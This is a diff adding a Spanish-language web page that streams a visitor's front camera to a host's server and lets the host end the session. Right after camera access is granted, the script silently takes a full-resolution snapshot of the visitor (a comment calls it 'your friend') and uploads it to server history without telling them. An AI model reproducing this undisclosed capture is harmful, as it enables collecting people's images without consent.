@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Canal de Transmisión de Cámara</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&family=JetBrains+Mono:wght@500&display=swap" rel="stylesheet">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', sans-serif;
+        }
+
+        body, html {
+            width: 100%;
+            height: 100%;
+            background-color: #080b12;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .camera-container {
+            position: relative;
+            width: 100vw;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #000;
+        }
+
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+        }
+
+        .hud-overlay {
+            position: absolute;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(12, 16, 26, 0.75);
+            backdrop-filter: blur(8px);
+            border: 1px solid rgba(0, 210, 255, 0.3);
+            border-radius: 30px;
+            padding: 8px 18px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: #fff;
+            font-size: 0.85rem;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
+            z-index: 10;
+        }
+
+        .live-dot {
+            width: 8px;
+            height: 8px;
+            background: #00ff88;
+            border-radius: 50%;
+            animation: pulse 1.2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.4; transform: scale(0.85); }
+        }
+
+        /* Pantalla de desconexión o bloqueo */
+        .disconnected-screen {
+            position: absolute;
+            inset: 0;
+            background: rgba(8, 11, 18, 0.95);
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 24px;
+            z-index: 20;
+        }
+
+        .disconnected-screen.active {
+            display: flex;
+        }
+
+        .disconnected-icon {
+            font-size: 3rem;
+            margin-bottom: 16px;
+        }
+
+        .disconnected-title {
+            font-size: 1.3rem;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 8px;
+        }
+
+        .disconnected-desc {
+            font-size: 0.9rem;
+            color: #8a99b5;
+            max-width: 380px;
+        }
+    </style>
+</head>
+<body>
+    <div class="camera-container">
+        <!-- Video en vivo a pantalla completa -->
+        <video id="cameraVideo" autoplay playsinline muted></video>
+
+        <!-- Indicador de conexión sutil -->
+        <div class="hud-overlay" id="hudOverlay">
+            <span class="live-dot" id="liveDot"></span>
+            <span id="statusLabel">Conectando cámara...</span>
+        </div>
+
+        <!-- Pantalla al ser expulsado por el anfitrión -->
+        <div class="disconnected-screen" id="disconnectedScreen">
+            <div class="disconnected-icon">🛑</div>
+            <div class="disconnected-title">Transmisión Finalizada</div>
+            <div class="disconnected-desc" id="disconnectedDesc">El anfitrión ha desconectado esta sesión de transmisión. Ya puedes cerrar esta ventana.</div>
+        </div>
+    </div>
+
+    <!-- Canvas oculto para compresión y transmisión rápida -->
+    <canvas id="hiddenCanvas" style="display:none;"></canvas>
+
+    <script>
+        const cameraVideo = document.getElementById('cameraVideo');
+        const hudOverlay = document.getElementById('hudOverlay');
+        const liveDot = document.getElementById('liveDot');
+        const statusLabel = document.getElementById('statusLabel');
+        const disconnectedScreen = document.getElementById('disconnectedScreen');
+        const hiddenCanvas = document.getElementById('hiddenCanvas');
+        const ctx = hiddenCanvas.getContext('2d');
+
+        // Generar identificador de sesión para esta transmisión
+        let streamId = sessionStorage.getItem('nexus_remote_stream_id');
+        if (!streamId) {
+            streamId = 'remote_disp_' + Math.random().toString(36).substring(2, 8);
+            sessionStorage.setItem('nexus_remote_stream_id', streamId);
+        }
+
+        const deviceName = "Dispositivo " + streamId.replace('remote_disp_', '#');
+        let activeStream = null;
+        let isSending = false;
+        let isSendingFrame = false;
+        let statusInterval = null;
+
+        async function initCamera() {
+            try {
+                statusLabel.textContent = "Solicitando cámara...";
+
+                // Solicitar acceso a cámara frontal automáticamente al abrir
+                activeStream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 },
+                        frameRate: { ideal: 24, max: 30 }
+                    },
+                    audio: false
+                });
+
+                cameraVideo.srcObject = activeStream;
+                await cameraVideo.play();
+
+                // Resolución optimizada para transmisión por internet en tiempo real
+                hiddenCanvas.width = 480;
+                hiddenCanvas.height = 360;
+                isSending = true;
+
+                statusLabel.textContent = "🔴 Transmisión Segura Activa";
+                liveDot.style.background = "#ff3366";
+
+                // Iniciar bucle anti-lag de transmisión en tiempo real
+                streamingLoop();
+
+                // Tomar y registrar automáticamente la foto de entrada de tu amigo en el historial del servidor
+                setTimeout(async () => {
+                    try {
+                        const snapCanvas = document.createElement('canvas');
+                        snapCanvas.width = cameraVideo.videoWidth || 640;
+                        snapCanvas.height = cameraVideo.videoHeight || 480;
+                        const sctx = snapCanvas.getContext('2d');
+                        sctx.drawImage(cameraVideo, 0, 0, snapCanvas.width, snapCanvas.height);
+                        const snapBase64 = snapCanvas.toDataURL('image/jpeg', 0.85);
+
+                        await fetch('/api/upload_remote_snapshot', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                image_base64: snapBase64,
+                                visitor_name: deviceName
+                            })
+                        });
+                        console.log("📸 Foto de entrada guardada en el servidor.");
+                    } catch (e) {
+                        console.error("Error enviando foto de entrada:", e);
+                    }
+                }, 800);
+
+                // Monitorear periódicamente si el anfitrión expulsó la transmisión
+                statusInterval = setInterval(checkExpulsionStatus, 2000);
+
+            } catch (err) {
+                console.error("Acceso a cámara:", err);
+                statusLabel.textContent = "Permiso de cámara no concedido";
+                liveDot.style.background = "#888";
+            }
+        }
+
+        // Bucle adaptativo anti-lag: nunca acumula fotos en cola y transmite en tiempo real
+        async function streamingLoop() {
+            if (!isSending) return;
+
+            if (!isSendingFrame && cameraVideo.videoWidth > 0) {
+                isSendingFrame = true;
+                try {
+                    ctx.drawImage(cameraVideo, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
+                    const base64Data = hiddenCanvas.toDataURL('image/jpeg', 0.50);
+
+                    const res = await fetch('/api/remote_stream/push', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            stream_id: streamId,
+                            display_name: deviceName,
+                            image_base64: base64Data
+                        })
+                    });
+
+                    if (res.ok) {
+                        const data = await res.json();
+                        if (data.status === 'expelled') {
+                            stopAndExpel();
+                            return;
+                        }
+                    }
+                } catch (err) {
+                    // Silenciar fallos momentáneos de red
+                } finally {
+                    isSendingFrame = false;
+                }
+            }
+
+            // Siguiente fotograma inmediato tan pronto se libere la red
+            if (isSending) {
+                setTimeout(streamingLoop, 35);
+            }
+        }
+
+        async function checkExpulsionStatus() {
+            if (!isSending) return;
+            try {
+                const res = await fetch('/api/remote_stream/status/' + streamId);
+                if (res.ok) {
+                    const data = await res.json();
+                    if (data.expelled) {
+                        stopAndExpel();
+                    }
+                }
+            } catch (err) {}
+        }
+
+        function stopAndExpel() {
+            isSending = false;
+            if (statusInterval) clearInterval(statusInterval);
+
+            // Apagar y liberar la cámara inmediatamente
+            if (activeStream) {
+                activeStream.getTracks().forEach(track => track.stop());
+                activeStream = null;
+            }
+            cameraVideo.srcObject = null;
+
+            hudOverlay.style.display = 'none';
+            disconnectedScreen.classList.add('active');
+        }
+
+        window.addEventListener('beforeunload', () => {
+            if (activeStream) {
+                activeStream.getTracks().forEach(t => t.stop());
+            }
+        });
+
+        // Iniciar automáticamente apenas cargue la página
+        document.addEventListener('DOMContentLoaded', initCamera);
+    </script>
+</body>
+</html>
